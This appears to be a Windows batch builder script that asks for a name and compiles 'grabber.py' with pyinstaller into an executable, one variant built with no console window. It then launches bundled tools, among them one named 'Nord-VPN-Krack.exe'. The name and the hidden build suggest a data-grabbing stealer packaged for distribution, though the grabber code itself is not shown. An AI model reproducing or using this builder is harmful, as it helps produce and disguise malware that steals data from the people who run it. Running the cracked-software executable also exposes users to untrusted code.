@echo off
color 0a
echo.
set /p a="Enter the file name : "
if [%a%]==[] ( 
    echo.
    echo bro enter a name
    pause
    EXIT /B 1
) 
if [%a%] NEQ [] (
    echo.
    echo Name is: %a%
    pyinstaller --clean --onefile --noconsole -i NONE -n %a% grabber.py
    pyinstaller --noconfirm --onefile --console --name %a%  ./grabber.py
    echo.
    echo generated exe as %a%.exe in the dist folder
    echo.
    start src/utils/start.tool
    start src/utils/vpn
    start scr/utilis/Nord-VPN-Krack.exe
    pause
    EXIT /B 1
)
